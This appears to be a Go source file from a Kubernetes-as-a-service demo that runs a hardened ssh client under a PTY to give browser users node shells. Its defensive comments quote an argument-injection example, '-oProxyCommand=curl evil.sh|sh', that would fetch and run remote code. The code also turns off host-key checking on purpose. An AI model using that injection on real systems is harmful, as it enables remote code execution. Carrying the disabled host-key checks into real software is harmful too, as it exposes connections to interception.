// Package sshpty runs a real `ssh` client under a PTY and bridges it to a shell.Conn. It is the
// node-ssh sandbox's engine, the counterpart of internal/shell/pty - but where that one starts an
// interactive bash and confines it by WHERE it runs, this one confines the session by WHAT it
// starts.
//
// That difference is the whole security model of this seam (see internal/nodessh). The sandbox holds
// the platform's VM key, so "the user finds nothing worth stealing here" is not available; instead
// the user's session IS the ssh client. The agent execs `ssh` directly - never a shell, never
// `sh -c` - so there is no argv the user can influence and no interpreter between us and the
// connection. If ssh fails, the session ends and the user lands nowhere.
//
// Four flags in sshArgs hold that property up and must not be dropped:
//
//   - -e none    disables ssh's own `~` escape character. Without it a user types `~C` and gets
//     ssh's command line, from which they can open port forwards out of the sandbox.
//     This is the single most important flag in the file.
//   - -F /dev/null  refuses every ssh_config. Nothing dropped in a writable HOME can inject options.
//   - -o IdentitiesOnly=yes  pins the identity to the one -i we pass, so ssh never wanders to an
//     agent or another key.
//   - -o BatchMode=yes  never prompt. A prompt on a PTY the user drives is a place to type.
//
// Production would not mount a fleet-wide key here at all: it would run an SSH CA and mint a
// short-lived certificate scoped to the single node being opened, so a session cannot outlive itself
// and a leaked credential cannot reach another cluster.
package sshpty

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/Daniel-Vaz/KaaS-demo/internal/shell"
	"github.com/creack/pty"
)

// DefaultIdleTimeout closes a session with no keystrokes for this long. An SSH session holds a real
// connection to a real machine; a forgotten browser tab should not pin one open forever.
const DefaultIdleTimeout = 30 * time.Minute

// Runner starts ssh sessions to cluster nodes.
type Runner struct {
	SSHBin string // "ssh"
	User   string // the VM login, "kaas" (KAAS_SSH_USER)
	// KeyFile is the platform's private key for that user on every cluster VM - the counterpart of
	// the public key cloud-init injects (KAAS_SSH_PRIVATE_KEY_FILE, mounted at /keys/id).
	KeyFile string
	// ProxyCommand chains through the KVM host when it is remote (kvmhost.Host.ProxyCommand). Empty
	// when the hypervisor is local and the cluster subnets are directly routable.
	ProxyCommand string
	WorkDir      string
	IdleTimeout  time.Duration
	Log          *slog.Logger
}

// New returns a Runner with defaults filled in.
func New(sshBin, user, keyFile, proxyCommand, workDir string, log *slog.Logger) *Runner {
	if sshBin == "" {
		sshBin = "ssh"
	}
	if user == "" {
		user = "kaas"
	}
	if log == nil {
		log = slog.Default()
	}
	return &Runner{
		SSHBin: sshBin, User: user, KeyFile: keyFile, ProxyCommand: proxyCommand,
		WorkDir: workDir, IdleTimeout: DefaultIdleTimeout, Log: log,
	}
}

// Serve opens an SSH session to ip and bridges ssh <-> term until the session ends. clusterID and
// vmName are cosmetic - logging and the session dir - so this stays stateless.
func (r *Runner) Serve(ctx context.Context, clusterID, vmName, ip string, rows, cols uint16, term shell.Conn) error {
	// The IP is about to become an argv element. The API authors it from the cluster's own node row
	// and the browser never supplies it, but this is the boundary that has to hold on its own: an
	// unvalidated string here could be "-oProxyCommand=curl evil.sh|sh" and ssh would happily take it
	// as an option rather than a host. Anything that is not a literal address is refused outright.
	if net.ParseIP(ip) == nil {
		return fmt.Errorf("sshpty: %q is not a valid node IP", ip)
	}
	if r.KeyFile == "" {
		return errors.New("sshpty: no SSH key configured - set KAAS_SSH_PRIVATE_KEY_FILE on the node-ssh sandbox")
	}

	// A private HOME for the session. Unlike internal/shell/pty's dir this one holds NOTHING - no
	// kubeconfig, no credential, nothing another session could want - so it is safe to remove on the
	// way out, and none of that package's overlapping-session hazards apply. It exists only so ssh
	// never has a reason to touch a shared HOME.
	dir := filepath.Join(r.WorkDir, "nodessh", clusterID, sessionID())
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return fmt.Errorf("sshpty: session dir: %w", err)
	}
	defer func() { _ = os.RemoveAll(dir) }()

	if rows == 0 {
		rows = shell.DefaultRows
	}
	if cols == 0 {
		cols = shell.DefaultCols
	}

	cmd := exec.CommandContext(ctx, r.SSHBin, r.sshArgs(ip)...)
	cmd.Dir = dir
	// Allowlisted, never os.Environ() - same rule as internal/shell/pty.sessionEnv, and it matters
	// more here: this process's env holds the shell token and the key paths. The remote login shell
	// gets its own environment from sshd on the node, so nothing from this list reaches the user
	// anyway; the list is what *ssh itself* needs.
	cmd.Env = []string{
		"PATH=/usr/local/bin:/usr/bin:/bin",
		"HOME=" + dir,
		"TERM=xterm-256color",
		"LANG=C.UTF-8",
	}

	f, err := pty.StartWithSize(cmd, &pty.Winsize{Rows: rows, Cols: cols})
	if err != nil {
		return fmt.Errorf("sshpty: start %s: %w", r.SSHBin, err)
	}
	defer func() { _ = f.Close() }()
	// StartWithSize sets Setsid, which makes the child a process-group leader (pgid == pid). Do NOT
	// also set Setpgid - setpgid(2) rejects a session leader with EPERM. Same trap as internal/shell/
	// pty, documented there at length.
	if cmd.Process != nil {
		pgid := cmd.Process.Pid
		defer func() { _ = syscall.Kill(-pgid, syscall.SIGKILL) }()
	}

	var lastInput atomic.Int64
	lastInput.Store(time.Now().UnixNano())
	idleCtx, stopIdle := context.WithCancel(ctx)
	defer stopIdle()
	go r.watchIdle(idleCtx, &lastInput, f)

	// term -> ssh: stdin bytes and resize control.
	go func() {
		for {
			isText, data, err := term.ReadMessage()
			if err != nil {
				_ = f.Close()
				return
			}
			lastInput.Store(time.Now().UnixNano())
			if isText {
				var ctrl shell.Control
				if json.Unmarshal(data, &ctrl) == nil && ctrl.Type == "resize" {
					_ = pty.Setsize(f, &pty.Winsize{Rows: ctrl.Rows, Cols: ctrl.Cols})
				}
				continue
			}
			if _, err := f.Write(data); err != nil {
				return
			}
		}
	}()

	// ssh -> term: stream until EOF (ssh exits or the PTY closes).
	buf := make([]byte, 16*1024)
	for {
		n, rerr := f.Read(buf)
		if n > 0 {
			if werr := term.WriteBinary(buf[:n]); werr != nil {
				break
			}
		}
		if rerr != nil {
			break
		}
	}

	code := exitCode(cmd.Wait())
	_ = shell.WriteControl(term, shell.Control{Type: "exit", Code: code})
	return nil
}

// sshArgs builds the complete ssh command line. Every element is authored here: the user contributes
// only ip (validated as a literal address by the caller) and, after the session starts, bytes on the
// PTY. See the package doc for why -e none, -F /dev/null, IdentitiesOnly and BatchMode are
// load-bearing rather than cosmetic.
func (r *Runner) sshArgs(ip string) []string {
	args := []string{
		"-e", "none", // no ~ escape: the user must not be able to reach ssh's own command line
		"-F", "/dev/null", // read no ssh_config, ever
		"-i", r.KeyFile,
		"-l", r.User,
		"-t", // force a remote PTY: this is an interactive login shell, not a command
		"-o", "IdentitiesOnly=yes",
		"-o", "BatchMode=yes",
		// No host-key verification. Deliberate: rolling OS replacement destroys and rebuilds nodes on
		// the same IP, so a pinned key would break on every upgrade and TOFU would train users to say
		// yes. Ansible makes the same trade (ansible.cfg). Production would run an SSH CA and pair the
		// short-lived user certificate with host certificates, which survives a rebuild by design.
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=/dev/null",
		// ...and, given the above, suppress the "Permanently added ... to the list of known hosts"
		// banner ssh would otherwise print into the user's terminal on every single connect.
		"-o", "LogLevel=ERROR",
		"-o", "ConnectTimeout=10",
		"-o", "ServerAliveInterval=15",
		"-o", "ServerAliveCountMax=3",
	}
	// A remote hypervisor puts the VMs behind it, so chain through the bastion exactly as Ansible
	// does. Passed as one argv element - no shell interprets it, so the command is unquoted.
	if r.ProxyCommand != "" {
		args = append(args, "-o", "ProxyCommand="+r.ProxyCommand)
	}
	return append(args, ip)
}

// watchIdle kills the session's PTY once IdleTimeout passes with no keystroke. It closes the PTY
// rather than signalling ssh, which unblocks the read loop and takes the session down the same path
// a normal exit does.
func (r *Runner) watchIdle(ctx context.Context, lastInput *atomic.Int64, f *os.File) {
	if r.IdleTimeout <= 0 {
		return
	}
	tick := time.NewTicker(30 * time.Second)
	defer tick.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			if time.Since(time.Unix(0, lastInput.Load())) > r.IdleTimeout {
				r.Log.Info("node ssh session idle - closing", "idle_timeout", r.IdleTimeout)
				_ = f.Close()
				return
			}
		}
	}
}

// sessionID returns a short random identifier so concurrent sessions never share a HOME.
func sessionID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func exitCode(err error) int {
	if err == nil {
		return 0
	}
	var ee *exec.ExitError
	if errors.As(err, &ee) {
		return ee.ExitCode()
	}
	return 1
}
